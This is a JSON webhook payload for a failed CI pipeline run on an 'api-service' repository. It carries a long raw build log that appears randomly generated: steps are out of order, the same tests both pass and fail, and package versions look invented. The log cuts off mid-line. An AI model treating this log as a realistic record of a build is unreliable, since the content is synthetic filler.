{
  "action": "completed",
  "workflow_run": {
    "id": 619,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-939",
    "head_sha": "5bdde804bf993d14ba8a199c15b0faf17daf6135",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-10T12:00:30.218860Z",
    "updated_at": "2025-12-10T12:05:10.880909Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: install_dependencies ===\n[12:00:30] INFO: Processing request\nStep 10/10: Building\nInstalling axios@2.20.0\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n\u2713 lint completed\n[12:00:30] WARN: Deprecated API usage\nStep 3/10: Building\nCache hit for key-3930\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (21MB)\nStep 4/10: Building\nCache hit for key-4022\nInstalling lodash@1.20.0\nFAILED: test_db_connect\nInstalling react@2.7.0\nCompiling src/main.py...\nStep 4/10: Building\nInstalling express@2.10.0\nStep 9/10: Building\n  PASS: test_api_health (322ms)\n\u2713 test completed\n  PASS: test_user_create (132ms)\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:30] INFO: Processing request\nInstalling prettier@2.9.0\nInstalling lodash@1.7.0\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/index.js...\nInstalling express@3.17.0\nInstalling prettier@5.9.0\nCache hit for key-2141\nInstalling react@4.16.0\n  PASS: test_db_connect (203ms)\nArtifact uploaded: build.tar.gz (50MB)\nStep 10/10: Building\n[12:00:30] WARN: Deprecated API usage\n\u2717 build failed with exit code 4\n  PASS: test_cache_hit (75ms)\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:30] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nInstalling express@5.15.0\nArtifact uploaded: build.tar.gz (4MB)\nCache hit for key-8388\n[12:00:30] INFO: Processing request\n\u2713 build completed\nStep 1/10: Building\nInstalling eslint@3.18.0\n[12:00:30] WARN: Deprecated API usage\nCompiling src/app.ts...\n  PASS: test_auth_login (354ms)\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-8008\n[12:00:30] WARN: Deprecated API usage\n  PASS: test_cache_hit (24ms)\nArtifact uploaded: build.tar.gz (36MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: react has known vulnerabilities\n  PASS: test_api_health (225ms)\n[12:00:30] INFO: Processing request\n  PASS: test_api_health (478ms)\nCache hit for key-7752\nCache hit for key-3188\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 lint completed\n  PASS: test_auth_login (498ms)\nCompiling src/app.ts...\n  PASS: test_cache_hit (255ms)\nArtifact uploaded: build.tar.gz (8MB)\nArtifact uploaded: build.tar.gz (31MB)\nInstalling lodash@3.19.0\nCompiling src/main.py...\nStep 4/10: Building\nStep 10/10: Building\nCompiling src/index.js...\nCache hit for key-5051\n  PASS: test_db_connect (16ms)\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:30] INFO: Processing request\nInstalling axios@5.7.0\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 lint completed\nStep 1/10: Building\n\u2713 lint completed\nCache hit for key-5879\nCompiling src/app.ts...\nStep 3/10: Building\n  PASS: test_api_health (460ms)\n  PASS: test_auth_login (367ms)\n[12:00:30] INFO: Processing request\n  PASS: test_cache_hit (255ms)\n  PASS: test_cache_hit (191ms)\n[12:00:30] INFO: Processing request\nStep 9/10: Building\nStep 3/10: Building\nCompiling src/utils.go...\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:30] INFO: Processing request\nCompiling src/handler.rs...\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (10MB)\nInstalling react@4.4.0\nInstalling prettier@2.15.0\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 lint completed\nCompiling src/app.ts...\nCache hit for key-9637\nCache hit for key-6326\n[12:00:30] INFO: Processing request\nStep 5/10: Building\nInstalling axios@2.18.0\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:30] INFO: Processing request\nCompiling src/utils.go...\n  PASS: test_auth_login (39ms)\n  PASS: test_user_create (241ms)\n  PASS: test_api_health (493ms)\n\u2717 build failed with exit code 54\n[12:00:30] INFO: Processing request\n=== Step install_dependencies completed ===\n=== Step: e2e_tests ===\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:30] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nCompiling src/index.js...\nCache hit for key-2371\nStep 4/10: Building\n\u2713 lint completed\nCache hit for key-3719\nCache hit for key-2339\n  PASS: test_api_health (177ms)\n  PASS: test_db_connect (281ms)\n\u2713 test completed\n\u2713 test completed\n[12:00:30] INFO: Processing request\nCache hit for key-7460\nWARNING: lodash has known vulnerabilities\nStep 9/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_user_create (338ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling eslint@5.14.0\nCache hit for key-4455\n[12:00:30] INFO: Processing request\n  PASS: test_api_health (312ms)\nCache hit for key-6837\nStep 2/10: Building\n  PASS: test_api_health (388ms)\nArtifact uploaded: build.tar.gz (17MB)\nInstalling lodash@1.18.0\n\u2713 lint completed\nCache hit for key-2800\n\u2713 test completed\nCompiling src/utils.go...\nInstalling lodash@5.8.0\nInstalling eslint@3.4.0\nStep 7/10: Building\n  PASS: test_user_create (372ms)\nCache hit for key-1148\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_cache_hit (186ms)\n[12:00:30] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nInstalling webpack@3.8.0\n[12:00:30] INFO: Processing request\n  PASS: test_auth_login (200ms)\nCache hit for key-9092\nCompiling src/handler.rs...\nStep 5/10: Building\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 lint completed\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_cache_hit (138ms)\nArtifact uploaded: build.tar.gz (5MB)\nInstalling axios@4.17.0\nCache hit for key-3218\nWARNING: jest has known vulnerabilities\nCache hit for key-3300\nCache hit for key-9196\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-5670\nWARNING: express has known vulnerabilities\n  PASS: test_cache_hit (5ms)\n\u2713 build completed\nCache hit for key-7938\nCache hit for key-2015\n  PASS: test_user_create (260ms)\nCache hit for key-5342\nInstalling jest@4.20.0\nCompiling src/index.js...\nCache hit for key-4466\nStep 2/10: Building\n  PASS: test_db_connect (265ms)\n  PASS: test_db_connect (309ms)\nStep 8/10: Building\nCache hit for key-3274\nStep 7/10: Building\nStep 10/10: Building\nWARNING: express has known vulnerabilities\nCache hit for key-2393\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nStep 8/10: Building\n\u2713 lint completed\n\u2713 build completed\nCache hit for key-8609\n[12:00:30] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/service.java...\n  PASS: test_cache_hit (452ms)\nInstalling eslint@2.20.0\nCompiling src/service.java...\n  PASS: test_cache_hit (216ms)\nStep 3/10: Building\nCompiling src/utils.go...\nStep 10/10: Building\nStep 10/10: Building\nInstalling eslint@2.14.0\nArtifact uploaded: build.tar.gz (39MB)\nStep 1/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:30] INFO: Processing request\nCompiling src/app.ts...\nWARNING: webpack has known vulnerabilities\nStep 5/10: Building\n\u2713 lint completed\n[12:00:30] WARN: Deprecated API usage\nInstalling react@4.18.0\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:30] INFO: Processing request\nStep 10/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (29MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_api_health (187ms)\nCompiling src/main.py...\n=== Step e2e_tests completed ===\n=== Step: deploy_production ===\nCache hit for key-2174\n\u2713 test completed\nInstalling webpack@5.16.0\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_auth_login (153ms)\n  PASS: test_db_connect (104ms)\nArtifact uploaded: build.tar.gz (15MB)\nInstalling eslint@2.0.0\nStep 7/10: Building\n[12:00:30] INFO: Processing request\nInstalling webpack@4.16.0\n  PASS: test_api_health (313ms)\nInstalling react@5.15.0\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:30] INFO: Processing request\nCache hit for key-1325\nCache hit for key-7539\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/handler.rs...\n\u2713 lint completed\n\u2713 lint completed\nInstalling lodash@1.6.0\nException: RuntimeError\nCache hit for key-7457\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (49MB)\nStep 7/10: Building\nException: TypeError\nCompiling src/index.js...\nInstalling jest@2.7.0\n[12:00:30] INFO: Processing request\nCache hit for key-4312\nStep 6/10: Building\n[12:00:30] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-4468\n  PASS: test_db_connect (416ms)\n\u2717 build failed with exit code 102\nInstalling express@2.14.0\n[12:00:30] WARN: Deprecated API usage\nStep 2/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:30] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (223ms)\n[12:00:30] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\nInstalling react@2.5.0\n\u2713 test completed\n\u2713 lint completed\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\nStep 1/10: Building\n\u2713 lint completed\nCompiling src/index.js...\nInstalling lodash@1.20.0\nCache hit for key-3401\nInstalling express@1.2.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 build completed\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCompiling src/service.java...\nCompiling src/app.ts...\nCache hit for key-1022\nCache hit for key-8049\n  PASS: test_auth_login (356ms)\nInstalling webpack@3.9.0\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-3295\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (41MB)\nStep 9/10: Building\n\u2713 lint completed\nCache hit for key-8898\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (42MB)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (7MB)\nStep 9/10: Building\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCache hit for key-9294\n\u2713 test completed\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCache hit for key-1727\n  PASS: test_db_connect (180ms)\nCompiling src/app.ts...\nCompiling src/utils.go...\n  PASS: test_db_connect (275ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-6473\n[12:00:30] INFO: Processing request\nWARNING: prettier has known vulnerabilities\n  PASS: test_db_connect (39ms)\n  PASS: test_user_create (101ms)\nWARNING: lodash has known vulnerabilities\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (9MB)\nStep 7/10: Building\nCache hit for key-9625\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:30] INFO: Processing request\n\u2713 build completed\n\u2713 test completed\nCache hit for key-4266\n\u2713 lint completed\nStep 2/10: Building\nInstalling lodash@3.17.0\nInstalling express@3.8.0\n=== Step deploy_production completed ===\n=== Step: setup_node ===\nCompiling src/handler.rs...\n\u2713 test completed\nStep 2/10: Building\n[12:00:30] INFO: Processing request\nInstalling prettier@4.4.0\n  PASS: test_api_health (275ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: jest has known vulnerabilities\n  PASS: test_cache_hit (395ms)\n[12:00:30] INFO: Processing request\nInstalling jest@4.5.0\n[12:00:30] INFO: Processing request\nInstalling react@2.9.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-3893\n  PASS: test_cache_hit (135ms)\nStep 7/10: Building\n[12:00:30] INFO: Processing request\n[12:00:30] WARN: Deprecated API usage\nCompiling src/utils.go...\nCache hit for key-8492\nInstalling react@3.5.0\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:30] WARN: Deprecated API usage\nCache hit for key-2645\n  PASS: test_auth_login (84ms)\n[12:00:30] INFO: Processing request\n\u2713 build completed\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nInstalling jest@4.1.0\nCache hit for key-2892\nStep 5/10: Building\nCompiling src/service.java...\n\u2717 build failed with exit code 66\nCompiling src/app.ts...\n\u2713 test completed\n  PASS: test_auth_login (173ms)\nInstalling lodash@3.7.0\n\u2713 test completed\nWARNING: express has known vulnerabilities\nCache hit for key-1935\nCompiling src/app.ts...\n  PASS: test_db_connect (160ms)\nCompiling src/index.js...\nStep 10/10: Building\n[12:00:30] INFO: Processing request\nStep 7/10: Building\nCompiling src/app.ts...\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (30MB)\nWARNING: eslint has known vulnerabilities\nInstalling express@2.12.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 6/10: Building\nCompiling src/service.java...\n  PASS: test_auth_login (450ms)\nInstalling webpack@4.5.0\nCompiling src/handler.rs...\n  PASS: test_api_health (88ms)\nCache hit for key-1041\nStep 7/10: Building\nCache hit for key-1853\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_user_create (194ms)\n  PASS: test_db_connect (122ms)\nCache hit for key-5673\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (40MB)\nCache hit for key-1158\nStep 3/10: Building\n[12:00:30] ERROR: Connection failed\nCache hit for key-3192\n\u2713 build completed\nCache hit for key-2969\nCompiling src/main.py...\nCompiling src/service.java...\nInstalling webpack@5.11.0\nCompiling src/utils.go...\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/handler.rs...\nCompiling src/main.py...\nCache hit for key-3352\nStep 6/10: Building\n[12:00:30] INFO: Processing request\nInstalling jest@5.8.0\nCompiling src/service.java...\n  PASS: test_user_create (40ms)\nInstalling webpack@2.20.0\nException: ValueError\nCompiling src/utils.go...\n  PASS: test_api_health (483ms)\n\u2713 lint completed\nCompiling src/service.java...\nCache hit for key-5391\nStep 5/10: Building\nInstalling eslint@5.14.0\nException: TypeError\n[12:00:30] INFO: Processing request\nCache hit for key-4098\n[12:00:30] INFO: Processing request\nInstalling eslint@1.1.0\n[12:00:30] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (50MB)\nInstalling eslint@2.3.0\nCompiling src/utils.go...\nInstalling eslint@1.9.0\nStep 10/10: Building\nWARNING: jest has known vulnerabilities\n  PASS: test_cache_hit (192ms)\n  PASS: test_auth_login (170ms)\n\u2713 build completed\nCache hit for key-4189\n\u2713 build completed\nCache hit for key-7025\nInstalling axios@2.19.0\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\n=== Step setup_node completed ===\n=== Step: integration_tests ===\nArtifact uploaded: build.tar.gz (33MB)\nStep 10/10: Building\nStep 5/10: Building\nCache hit for key-2261\n\u2713 build completed\nCompiling src/index.js...\n\u2713 lint completed\nInstalling webpack@4.16.0\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nInstalling express@2.11.0\nStep 7/10: Building\nCompiling src/utils.go...\nInstalling lodash@3.19.0\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (7MB)\nStep 10/10: Building\n[12:00:30] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-8601\nStep 3/10: Building\nStep 3/10: Building\n  PASS: test_user_create (123ms)\nCompiling src/app.ts...\n  PASS: test_cache_hit (48ms)\nException: ValueError\nException: TypeError\nCache hit for key-6790\nCompiling src/service.java...\n[12:00:30] INFO: Processing request\nCache hit for key-2295\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_user_create (56ms)\n[12:00:30] WARN: Deprecated API usage\nCompiling src/utils.go...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (22MB)\nStep 5/10: Building\nCompiling src/utils.go...\nInstalling prettier@5.16.0\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n\u2713 lint completed\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCompiling src/main.py...\nCompiling src/main.py...\n\u2713 test completed\nStep 2/10: Building\nCache hit for key-2273\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-6415\n[12:00:30] INFO: Processing request\nCache hit for key-5920\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (2MB)\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/service.java...\n  PASS: test_user_create (417ms)\nInstalling eslint@2.11.0\nCache hit for key-2961\nCompiling src/index.js...\n  PASS: test_api_health (459ms)\n\u2713 build completed\nCompiling src/handler.rs...\nInstalling react@3.10.0\n\u2713 build completed\nCompiling src/handler.rs...\nCache hit for key-6474\nWARNING: prettier has known vulnerabilities\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (10MB)\nWARNING: eslint has known vulnerabilities\nInstalling webpack@5.6.0\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/app.ts...\n[12:00:30] INFO: Processing request\nCompiling src/index.js...\nStep 9/10: Building\nStep 2/10: Building\nException: RuntimeError\nException: NullPointerException\nCompiling src/utils.go...\nCompiling src/utils.go...\nCache hit for key-6242\nStep 6/10: Building\n  PASS: test_cache_hit (180ms)\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCompiling src/service.java...\nStep 9/10: Building\n\u2713 test completed\nCompiling src/handler.rs...\n\u2713 build completed\n\u2713 build completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (20MB)\nStep 2/10: Building\nStep 10/10: Building\n\u2717 build failed with exit code 101\n[12:00:30] INFO: Processing request\nCompiling src/handler.rs...\nInstalling prettier@4.8.0\nArtifact uploaded: build.tar.gz (29MB)\nInstalling lodash@5.11.0\nInstalling eslint@5.9.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (10MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling lodash@2.4.0\nInstalling webpack@2.9.0\n[12:00:30] INFO: Processing request\nInstalling jest@4.17.0\nFAILED: test_api_health\n\u2713 build completed\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (48MB)\nCompiling src/app.ts...\n\u2713 test completed\n=== Step integration_tests completed ===\n=== Step: unit_tests ===\n\u2713 test completed\n[12:00:30] INFO: Processing request\n\u2713 test completed\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 lint completed\nInstalling prettier@1.15.0\nCompiling src/index.js...\n  PASS: test_user_create (220ms)\n[12:00:30] INFO: Processing request\nInstalling express@5.14.0\nStep 6/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nStep 10/10: Building\n  PASS: test_cache_hit (86ms)\nCompiling src/index.js...\nCache hit for key-9433\nInstalling lodash@5.14.0\nCache hit for key-8271\n\u2713 build completed\nInstalling prettier@5.16.0\n  PASS: test_auth_login (222ms)\nCache hit for key-9146\nCache hit for key-2252\nInstalling eslint@4.8.0\nArtifact uploaded: build.tar.gz (5MB)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:30] INFO: Processing request\n\u2713 build completed\nStep 10/10: Building\nStep 5/10: Building\nCache hit for key-1662\n[12:00:30] INFO: Processing request\nWARNING: eslint has known vulnerabilities\n  PASS: test_api_health (220ms)\n\u2717 build failed with exit code 112\nCache hit for key-7663\nCache hit for key-1094\n[12:00:30] INFO: Processing request\n  PASS: test_user_create (238ms)\n\u2713 build completed\nCompiling src/utils.go...\n[12:00:30] WARN: Deprecated API usage\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:30] INFO: Processing request\nStep 1/10: Building\nCompiling src/service.java...\nStep 7/10: Building\n[12:00:30] INFO: Processing request\n  PASS: test_user_create (158ms)\n\u2713 lint completed\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (16MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 9/10: Building\n\u2713 lint completed\nCache hit for key-8310\nInstalling webpack@1.19.0\nCompiling src/index.js...\n\u2713 test completed\nCompiling src/main.py...\nStep 9/10: Building\nInstalling lodash@3.20.0\nInstalling jest@3.16.0\nStep 10/10: Building\nStep 6/10: Building\n[12:00:30] INFO: Processing request\nInstalling jest@5.17.0\n  PASS: test_auth_login (277ms)\nStep 2/10: Building\nCache hit for key-2201\nInstalling prettier@5.7.0\n\u2717 build failed with exit code 35\n[12:00:30] INFO: Processing request\nException: RuntimeError\n[12:00:30] WARN: Deprecated API usage\nStep 9/10: Building\nInstalling react@5.0.0\n\u2713 test completed\nInstalling webpack@1.4.0\n\u2713 build completed\n[12:00:30] INFO: Processing request\n\u2713 lint completed\n[12:00:30] INFO: Processing request\nStep 1/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (28MB)\nArtifact uploaded: build.tar.gz (46MB)\n  PASS: test_user_create (440ms)\n  PASS: test_auth_login (145ms)\nInstalling lodash@5.3.0\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (40MB)\nInstalling lodash@3.16.0\nArtifact uploaded: build.tar.gz (33MB)\nCompiling src/app.ts...\n\u2713 test completed\n\u2713 test completed\nStep 3/10: Building\n  PASS: test_user_create (8ms)\nException: RuntimeError\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:30] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/index.js...\n\u2713 build completed\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_cache_hit (436ms)\nStep 6/10: Building\n[12:00:30] WARN: Deprecated API usage\n  PASS: test_api_health (63ms)\nInstalling jest@5.12.0\n  PASS: test_cache_hit (210ms)\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_db_connect (405ms)\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling webpack@5.3.0\n=== Step unit_tests completed ===\n=== Step: build ===\n\u2713 test completed\n  PASS: test_api_health (450ms)\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_cache_hit (75ms)\nCache hit for key-5283\nCache hit for key-3560\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (32MB)\nInstalling react@5.13.0\n  PASS: test_cache_hit (332ms)\nStep 9/10: Building\n  PASS: test_api_health (18ms)\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (44MB)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_user_create (268ms)\n\u2713 test completed\nCompiling src/utils.go...\n\u2713 test completed\nCache hit for key-6773\nInstalling webpack@4.13.0\n[12:00:30] ERROR: Connection failed\nCompiling src/utils.go...\nWARNING: axios has known vulnerabilities\n\u2713 build completed\nCache hit for key-4068\nCache hit for key-3314\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (20MB)\nStep 4/10: Building\nInstalling express@2.16.0\nInstalling express@1.5.0\n  PASS: test_auth_login (438ms)\nArtifact uploaded: build.tar.gz (30MB)\nInstalling eslint@5.14.0\nInstalling express@1.12.0\nCache hit for key-1866\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:30] INFO: Processing request\nStep 5/10: Building\n\u2713 lint completed\nInstalling lodash@2.0.0\n[12:00:30] ERROR: Connection failed\nCache hit for key-5507\nInstalling lodash@3.2.0\nStep 10/10: Building\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:30] INFO: Processing request\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-1373\n\u2713 test completed\nCompiling src/main.py...\nCompiling src/utils.go...\n[12:00:30] INFO: Processing request\nCompiling src/handler.rs...\nInstalling express@5.1.0\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:30] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nStep 7/10: Building\nStep 3/10: Building\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (24MB)\nArtifact uploaded: build.tar.gz (33MB)\nInstalling webpack@3.10.0\nCompiling src/index.js...\n  PASS: test_auth_login (207ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_auth_login (268ms)\nCache hit for key-3710\nStep 2/10: Building\nCache hit for key-8653\n[12:00:30] INFO: Processing request\nCache hit for key-2724\n[12:00:30] INFO: Processing request\nCompiling src/utils.go...\n[12:00:30] INFO: Processing request\nCompiling src/main.py...\nCompiling src/main.py...\n\u2713 test completed\nStep 1/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_cache_hit (118ms)\n[12:00:30] INFO: Processing request\nInstalling lodash@2.13.0\nCache hit for key-8646\n\u2713 lint completed\nInstalling lodash@3.18.0\n\u2713 build completed\nFAILED: test_auth_login\n\u2713 build completed\nCompiling src/app.ts...\nCache hit for key-6995\nCache hit for key-8838\n[12:00:30] INFO: Processing request\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/app.ts...\n\u2713 lint completed\nWARNING: axios has known vulnerabilities\n\u2713 test completed\nCache hit for key-4265\nCompiling src/utils.go...\nCache hit for key-6140\nInstalling webpack@3.13.0\nStep 8/10: Building\nCompiling src/handler.rs...\nCache hit for key-8393\n\u2713 build completed\nStep 10/10: Building\n[12:00:30] WARN: Deprecated API usage\nException: RuntimeError\nInstalling eslint@2.20.0\n=== Step build completed ===\n=== Step: save_cache ===\nCompiling src/service.java...\nCompiling src/handler.rs...\nCache hit for key-5345\n\u2713 lint completed\nException: NullPointerException\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (27MB)\n\u2717 build failed with exit code 92\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (49MB)\nCache hit for key-9031\nCache hit for key-3168\nCache hit for key-1303\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling webpack@2.0.0\nStep 7/10: Building\nCompiling src/handler.rs...\nInstalling express@3.18.0\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:30] WARN: Deprecated API usage\nStep 8/10: Building\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (39MB)\nWARNING: jest has known vulnerabilities\n\u2713 lint completed\nInstalling webpack@1.1.0\nCompiling src/utils.go...\n\u2713 lint completed\nCache hit for key-4208\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-5822\n[12:00:30] WARN: Deprecated API usage\n\u2717 build failed with exit code 47\n\u2713 test completed\n[12:00:30] INFO: Processing request\nInstalling express@3.1.0\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (6MB)\nFAILED: test_cache_hit\nInstalling prettier@2.16.0\n\u2713 lint completed\nInstalling jest@5.19.0\n  PASS: test_db_connect (482ms)\n\u2713 build completed\n\u2713 build completed\n[12:00:30] INFO: Processing request\n  PASS: test_auth_login (298ms)\n\u2717 build failed with exit code 118\nCompiling src/utils.go...\nCompiling src/main.py...\nStep 6/10: Building\nCompiling src/handler.rs...\nCache hit for key-7985\n\u2713 test completed\n[12:00:30] INFO: Processing request\nCache hit for key-9035\nCompiling src/index.js...\nStep 1/10: Building\nCompiling src/main.py...\n  PASS: test_auth_login (484ms)\nInstalling prettier@1.13.0\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/app.ts...\nCache hit for key-9332\nStep 5/10: Building\n\u2713 test completed\n  PASS: test_api_health (169ms)\nStep 2/10: Building\n[12:00:30] WARN: Deprecated API usage\nInstalling webpack@5.8.0\nInstalling react@1.20.0\n[12:00:30] INFO: Processing request\nInstalling prettier@3.18.0\nStep 3/10: Building\n[12:00:30] INFO: Processing request\nInstalling axios@3.4.0\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:30] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_auth_login (404ms)\nCompiling src/service.java...\nStep 6/10: Building\nStep 2/10: Building\nCache hit for key-2003\n  PASS: test_user_create (411ms)\nInstalling jest@2.16.0\nInstalling axios@3.9.0\n  PASS: test_user_create 